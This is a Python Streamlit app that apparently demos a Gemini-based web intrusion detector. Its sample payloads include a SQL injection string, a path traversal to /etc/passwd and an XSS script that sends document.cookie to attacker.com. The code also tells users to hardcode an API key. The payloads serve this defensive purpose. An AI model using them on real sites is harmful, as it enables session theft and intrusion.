import json
import streamlit as st
from google import genai

# Page Configuration
st.set_page_config(
    page_title="GuardAI - Web Intrusion Detection", layout="wide"
)

st.title("GuardAI: Real-Time Web Intrusion Detection")
st.markdown(
    "Analyze web payloads and HTTP requests using **Gemini** to detect security"
    " vulnerabilities instantly."
)

# --- HARDCODED API KEY (Ready for direct deployment) ---
# Replace "YOUR_API_KEY_HERE" with your actual Gemini API key:
API_KEY = "YOUR_API_KEY_HERE"

# --- SIDEBAR CONFIGURATION ---
with st.sidebar:
  st.header("Configuration")
  st.success("API Key configured internally.")

  st.markdown("---")
  st.markdown("### Test Samples")
  sample_choice = st.selectbox(
      "Load Sample Payload:",
      [
          "Select a sample...",
          "SQL Injection (SQLi)",
          "Cross-Site Scripting (XSS)",
          "Path Traversal",
          "Clean Traffic (Safe)",
      ],
  )

# Sample payloads dictionary
samples = {
    "SQL Injection (SQLi)": "' OR '1'='1' --",
    "Cross-Site Scripting (XSS)": (
        "<script>fetch('http://attacker.com/steal?cookie=' +"
        " document.cookie)</script>"
    ),
    "Path Traversal": "../../../../etc/passwd",
    "Clean Traffic (Safe)": (
        "Hello, I would like to update my account email address to"
        " user@example.com"
    ),
}

# --- MAIN INTERFACE ---
col1, col2 = st.columns(2)

with col1:
  st.subheader("Live Traffic / Payload Inspector")

  # Populate text area if a sample is selected
  initial_text = (
      samples[sample_choice]
      if sample_choice != "Select a sample..."
      else ""
  )
  payload_text = st.text_area(
      "Enter HTTP request body, query string, or payload:",
      value=initial_text,
      height=180,
      placeholder="Type or paste payload here...",
  )

  analyze_btn = st.button("Analyze Payload", type="primary")

with col2:
  st.subheader("AI Security Suggestions")

  if analyze_btn:
    if not API_KEY or API_KEY == "YOUR_API_KEY_HERE":
      st.warning(
          "**API Key Missing**: Please edit `app.py` and insert your actual"
          " Gemini API key into the `API_KEY` variable."
      )
    elif not payload_text.strip():
      st.warning(
          "**Empty Payload**: Please enter or select a payload to inspect."
      )
    else:
      try:
        # Initialize the GenAI client with the hardcoded key
        client = genai.Client(api_key=API_KEY)

        with st.spinner("Analyzing payload behavior with Gemini..."):
          system_instruction = (
              "You are an expert Web Application Firewall (WAF) and security"
              " analyst. Analyze the provided web request payload for"
              " vulnerabilities such as SQLi, XSS, Path Traversal, Command"
              " Injection, etc. Return ONLY a valid JSON object with the"
              ' following exact keys: "status" (string: "SAFE" or "MALICIOUS"),'
              ' "risk_score" (integer 0-100), "threat_type" (string: name of'
              ' threat or "None"), "explanation" (string: why it is dangerous'
              ' or safe), and "remediation" (string: how to fix or prevent'
              " it)."
          )

          response = client.models.generate_content(
              model="gemini-2.5-flash",
              contents=f"Payload to analyze: {payload_text}",
              config={"system_instruction": system_instruction},
          )

          # Clean up and parse JSON response
          raw_text = response.text.strip()
          if raw_text.startswith("```json"):
            raw_text = raw_text[7:]
          if raw_text.endswith("```"):
            raw_text = raw_text[:-3]

          result = json.loads(raw_text.strip())

          # Display results based on status
          status = result.get("status", "SAFE")
          risk_score = result.get("risk_score", 0)

          if status == "MALICIOUS":
            st.error(f"**Threat Detected: {result.get('threat_type')}**")
          else:
            st.success("**Traffic is Clean / Safe**")

          st.metric(label="Calculated Risk Score", value=f"{risk_score} / 100")

          st.markdown("### Analysis Breakdown")
          st.info(result.get("explanation"))

          st.markdown("### Remediation Guidance")
          st.code(result.get("remediation"), language="text")

      except Exception as e:
        error_message = str(e)
        if "400" in error_message or "API_KEY_INVALID" in error_message:
          st.error(
              "**Invalid API Key**: The Gemini API key hardcoded in `app.py`"
              " is not valid. Please update it with a fresh key."
          )
        else:
          st.error(
              f"**Analysis Error**: Something went wrong. Details:"
              f" {error_message}"
          )
  else:
    st.info(
        "Select a sample or type a payload on the left and click **Analyze"
        " Payload** to test."
    )
